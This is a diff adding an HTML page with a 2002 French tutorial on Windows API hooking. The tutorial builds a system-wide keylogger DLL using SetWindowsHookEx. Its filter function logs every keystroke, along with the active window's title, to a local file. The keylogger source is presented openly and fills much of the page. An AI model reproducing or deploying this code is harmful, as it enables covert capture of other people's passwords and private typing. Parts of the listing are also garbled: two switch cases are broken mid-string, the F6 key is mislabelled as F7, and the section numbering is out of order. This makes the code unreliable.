@@ -1,0 +1,321 @@
+<html>
+<head>
+<title></title>
+</head>
+<body bgcolor="black" text="white" vlink="red" alink="red" link="red">
+<table border="0">
+<tr>
+   <td>&nbsp;</td>
+   <td><center><script language="JavaScript1.2">dqm__codebase = "Script/"</script>
+               <script language="JavaScript1.2" src="sample1_data.js"></script>
+               <script language="JavaScript1.2" src="Script/tdqm_loader.js"></script>
+               <script language="JavaScript1.2">generate_mainitems()</script>
+   </center></td>
+</tr>
+</table>
+<pre>
+Dark-Avenger, Juillet 2002
+
+                                       +-----------------------+
+                                       | API Hooking: partie 1 |
+                                       +-----------------------+
+
+
+1. Introduction:
+----------------
+
+D'après la MSDN, un hook est un point particulier dans le mécanisme de de gestions des messages
+de Windows où une application peut installer une sous-routine dans le but d'observer les messages
+émis vers les autre applications. En fait, un hook permet d'intercepter, et donc aussi modifier un
+message avant qu'il n'atteigne l'application à laquelle il est destiné. On peut aussi se contenter
+de lire le contenu de chaque message intercepté de manière totalement transparente pour le reste du
+système. Les fonctions qui sont chargées de recevoir les messages intercéptés sont appelés fonctions
+filtres et sont distinctes selon le type de messages qu'elles interceptent. Ce type de hook (il en
+existe d'autres) nommé System Wide Hook est normallement implémenté dans une DLL (on appelle cela un
+hook système), mais peut aussi, dans certains cas, être implémenté dans une .EXE (on appelle cela un
+hook de thread). L'intérêt de placer un hook dans une DLL est que les hooks systèmes on la priorités
+sur les hooks de thread.
+
+2. Les différents messages interceptables:
+------------------------------------------
+
+
+   Type de message
+   Informations contenus dans le message
+
+
+   WH_MSGFILTER
+   Les MessageBox, boites de dialogues, menus et barres de défilement
+
+
+   WH_SYSMSGFILTER
+   Idem
+
+
+   WH_GETMESSAGE
+   Tous les messages (déclenchée par GetMessage ou PeekMessage)
+
+
+   WH_CALLWNDPROC
+   Tous les messages (déclenchée par SendMessage)
+
+
+   WH_JOURNALRECORD
+   Le clavier et la souris (messages en lecture seule), messages destinés à êtres enregistrés
+
+
+   WH_JOURNALPLAYBACK
+   Permet la re-émission des messages enregistrés par un hook de type WH_JOURNALRECORD
+
+
+   WH_KEYBOARD
+   Le clavier (lecture/écriture)
+
+
+   WH_MOUSE
+   La souris (lecture/écriture)
+
+
+   WH_CBT
+   Toutes les opérations affectant les fenêtres: création, réduction, agrandissement.
+
+
+   WH_DEBUG
+   Les hooks eux-mêmes. Permet de court-circuiter n'importe quel hook.
+
+
+3. Création d'un hook:
+----------------------
+
+Un hook est créé par un appel à la fonction SetWindowsHookEx dont le prototype est:
+
+HHOOK SetWindowsHookEx(
+          int idHook,        //le type de hook à installer
+          HOOKPROC lpfn,     //l'adresse de la fonction filtre castée en HOOKPROC
+          HINSTANCE hMod,    //handle de l'application contenant la fonction filtre
+          DWORD dwThreadId,  //thread associé (en général 0: thread existant)
+          );
+
+Si aucune erreur n'a lieu, la fonction retourne l'handle du hook créé. Cette valeur est nécessaire lors
+de l'appel à la fonction CallNextHook. Si la création à lieu, windows injecte automatiquement (mais pas
+névessairement immédiatement) la dll dans tous les processus qui utilisent le genre de messages que traite
+la fonction filtre. Voici un exemple tiré du code source en téléchargement:
+
+__declspec(dllexport) int _stdcall fnStartLogging()
+{
+        k_hook = SetWindowsHookEx(
+                       WH_KEYBOARD,            //Le type de hook à installer
+                       (HOOKPROC)KeyboardHook, //Addr. de la fonction filtre
+                       hDLLInstance,           //Handle de l'app. contenant la fonction filtre
+                       0);                     //Thread associé, ici mis à 0
+        //Hook créé ? 0, Erreur: -1
+        return ((k_hook!=0)?0:-1);
+}
+
+Un hook est chargé par plusieurs processus qui ne partagent pas le même espace mémoire. L'handle du hook que nous
+venons de créer et qui sera utilisé par la fonction CallNextHook doit être virtuellement présent dans tous les espaces
+mémoires. C'est à dire qu'il doit être partagé par tous les processus "hookés". pour cela, nous devons placer cette
+variable dans la section partagée (shared data section). Voici un exemple tiré du code source en téléchargement:
+
+       #pragma data_seg(".APIhook")
+          //Contient l'handle de notre Dll
+          static HINSTANCE hDLLInstance;
+          //Handle vers la procédure gérant le hook
+          HHOOK k_hook;
+          //Créé un pointeur de type FILE
+          FILE *k_Write;
+          //Chemin d'accès au fichier de logs
+          static char k_LogPath[] = "c:\\Keylogger.txt";
+          //Tableau contenant le nom des fenetres actives
+          char k_LastWinCaption[256];
+       #pragma data_seg()
+
+Une fois cela fait, nous devons ajouter les lignes suivantes au fichier .def:
+
+             SECTIONS
+               .APIhook Read Write Shared
+
+Il est aussi possible d'utiliser la commande suivante directement dans le fichier source en C:
+
+             #pragma comment(linker, "/section:.APIhook, rws")
+
+
+6. Suppression d'un hook:
+-------------------------
+
+A chaque fois qu'une DLL créant un hook est chargé dans l'espace mémoire d'un processus, il n'y a pas d'autre manière
+pour supprimer le hook qu'appeller la fonction UnhookWindowsHookEx ou fermer l'application "hookée". Quand la fonction
+UnhookWindowsHookEx est appellée, windows va chercher dans une liste tous les processus qui ont été forcés de charger
+la DLL. Après cela, la DLL va être déchargé de chacun des processus auxquels elle était attachée (en réalité, ce n'est
+pas aussi simple que cela...). Voici un exemple tiré du code source en téléchargement:
+
+__declspec(dllexport) int _stdcall fnEndLogging()
+{
+        int UnHook_k_hook;
+        UnHook_k_hook = UnhookWindowsHookEx(k_hook);
+        //Hook supprimé ? 0, Erreur: -1
+        return ((UnHook_k_hook!=0)?0:-1);
+}
+
+
+5. Création de la fonction filtre:
+----------------------------------
+
+La première chosa à savoir est que cette fonction doit avoir une valeur de retour de type LRESULT, c'est à dire un LONG,
+un entier signé, de 32 bits. Ensuite, elle doit avoir le préfixe CALLBACK signifiant que notre fonction est une fonction
+destinée à être appelée par Windows, et non pas par une application. Voici le prototype de la fonction filtre contenue
+dans le code source en téléchargement:
+
+       LRESULT CALLBACK Nom_de_la_fonction_filtre(int nCode, WORD wParam, DWORD lParam)
+
+Description des paramètres:
+
+       int nCode:
+
+Sert à informer la fonction filtre du statut du message intercepté.
+A savoir si ce dernier a été ou non enlevé de la chaîne des messages
+Windows par une autre application suite à un appel de la fonction
+PeekMessage. Si PeekMessage a été appelé avec l'indicateur wRemoveMsg
+mis à PM_NOREMOVE alors le message n'est pas supprimé. Sinon, si
+l'indicateur wRemoveMsg est mis à PM_REMOVE, alors le message l'est.
+
+       WORD wParam:
+
+Transmet au programme le code cirtuel (virtual-key code) de la touche qui est à l'origine du message.
+
+       DWORD lParam:
+
+Combiné avec différents masques, ce paramètre permet d'obtenir quelques
+informations supplémentaires sur le message:
+
+         - le nombre de répétitions de la touche (de 0 à 15)
+         - le scan-code (permet l'identification physique de la touche) de
+           la touche (de 16 à 23)
+         - le type de la touche concernée: spécial ou non, comme la touche F10
+         - le contexte de la touche, càd si elle est ou non combinée avec la
+           touche alt
+         - L'état précédent de la touche, appuyée ou non (lParam=30) et sa
+           transition: si elle est en train d'être appuyée ou relachée (lParam=32)
+
+
+Voici la fonction filtre contenue dans le code source en téléchargement:
+
+LRESULT CALLBACK KeyboardHook(int nCode, WORD wParam, DWORD lParam)
+{
+        LRESULT NextHook = CallNextHookEx(k_hook, nCode, wParam, lParam);
+        //Si c'est une répétition, on termine et on passe la main à un
+        //autre hook
+        if(!((DWORD)lParam & 0x40000000)){
+                return NextHook;
+        }
+        //Ouvre le fichier de logs en écriture
+        k_Write = fopen(k_LogPath, "a+");
+        //Récupère l'handle de la fenêtre active
+        HWND k_hwnd = GetActiveWindow();
+        char k_WinBuffer[256];
+        //Récupère le titre de la fenêtre active et le stoque dans k_hwnd
+        GetWindowText(k_hwnd, (LPTSTR)k_WinBuffer, 256);
+        //Compare le titre de la fenêtre actuel et celui contenu dans
+        //k_LastWinCaption
+        if(strcmp(k_LastWinCaption, k_WinBuffer)){
+                //Met à jour le focus
+                strncpy(k_LastWinCaption, k_WinBuffer, 256);
+                char message[300];
+                //Formate le titre de la nouvelle fenêtre et le message à inscrire
+                //dans le fichier de logs
+                wsprintf(message, "\n\n -== Fenêtre: '%s' ==-\n", k_WinBuffer);
+                //Ecrit le nom de la nouvelle fenêtre dans le fichier de logs
+                WriteSpecialMsg(message);
+        }
+        //Touches spéciales ?
+        switch(wParam){
+        case VK_RETURN:
+                WriteSpecialMsg("\n");
+                break;
+        case VK_CONTROL:
+                WriteSpecialMsg("[Ctrl]");
+                break;
+        case VK_MENU:
+                WriteSpecialMsg("[Alt]");
+                break;
+        case VK_DELETE:
+                WriteSpecialMsg("[Del]");
+                break;
+        case VK_BACK:
+                WriteSpecialMsg("[break;
+        case VK_LEFT:
+                WriteSpecialMsg("[break;
+        case VK_RIGHT:
+                WriteSpecialMsg("[->]");
+                break;
+        case VK_TAB:
+                WriteSpecialMsg("[Tab]");
+                break;
+        case VK_END:
+                WriteSpecialMsg("[Fin]");
+                break;
+        case VK_F1:
+                WriteSpecialMsg("[F1]");
+                break;
+        case VK_F2:
+                WriteSpecialMsg("[F2]");
+                break;
+        case VK_F3:
+                WriteSpecialMsg("[F3]");
+                break;
+        case VK_F4:
+                WriteSpecialMsg("[F4]");
+                break;
+        case VK_F5:
+                WriteSpecialMsg("[F5]");
+                break;
+        case VK_F6:
+                WriteSpecialMsg("[F7]");
+                break;
+        case VK_F8:
+                WriteSpecialMsg("[F8]");
+                break;
+        case VK_F9:
+                WriteSpecialMsg("[F9]");
+                break;
+        case VK_F10:
+                WriteSpecialMsg("[F10]");
+                break;
+        case VK_F11:
+                WriteSpecialMsg("[F11]");
+                break;
+        case VK_F12:
+                WriteSpecialMsg("[F12]");
+                break;
+        //Si c'est une touche alphanumérique
+        default:
+                //Pointeur refléyant l'état actuel du clavier
+                BYTE k_KeyboardState[256];
+                //Sauvegarde l'état du clavier
+                GetKeyboardState(k_KeyboardState);
+                //Reçoit une représentation de la touche
+                WORD wBuf;
+                //Identifie la touche hysique sur le clavier
+                UINT ScanCode = 0;
+                char ch;
+                //Convertit le Virtual-Key-Code en caractère
+                ToAscii(wParam, ScanCode, k_KeyboardState, &wBuf, 0);
+                ch = ((char)wBuf);
+                //Enregistre la représentation de la touche dans le fichier de logs
+                fwrite(&ch, sizeof(ch), 1, k_Write);
+        }
+        //Ferme le fichier de logs
+        fclose(k_Write);
+        //Passe la main à un autre hook
+        return NextHook;
+}
+
+6. Conclusion:
+--------------
+
+Voilà, c'est terminé pour aujourd'hui. A plus...
+
+</pre>
+</body>
+</body>
+</html>
